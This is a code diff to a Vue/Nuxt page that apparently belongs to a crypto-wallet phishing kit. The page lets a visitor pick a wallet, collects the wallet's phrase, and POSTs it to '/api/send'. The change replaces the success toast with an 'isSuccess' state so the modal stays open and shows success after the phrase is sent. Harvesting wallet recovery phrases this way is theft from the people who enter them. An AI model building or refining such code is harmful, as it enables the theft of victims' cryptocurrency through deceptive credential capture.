@@ -246,8 +246,10 @@
         :show="showWalletModal"
         :wallet-name="selectedWallet.name"
         :wallet-logo="selectedWallet.logo"
+        :is-success="isSuccess"
         @close="closeWallet"
         @submit="submitWalletPhrase"
+        @reset-success="isSuccess = false"
     />
 
   </div>
@@ -271,7 +273,7 @@ const wallets = walletsData as Wallet[]
 const showHeader = ref(false)
 const showWalletModal = ref(false)
 const selectedWallet = ref<Wallet>(wallets[0]!)
-
+const isSuccess = ref(false)
 const openWallet = (wallet: Wallet) => {
   selectedWallet.value = wallet
   showWalletModal.value = true
@@ -286,8 +288,7 @@ async function submitWalletPhrase(payload: { walletPhrase: string, walletName: s
   try {
     await $fetch('/api/send', { method: 'POST', body: payload })
     status.value = 'sent'
-    toast.success('Wallet phrase sent successfully!')
-    showWalletModal.value = false
+    isSuccess.value = true
   } catch {
     toast.error('Something went wrong. Please try again.')
     status.value = 'error'
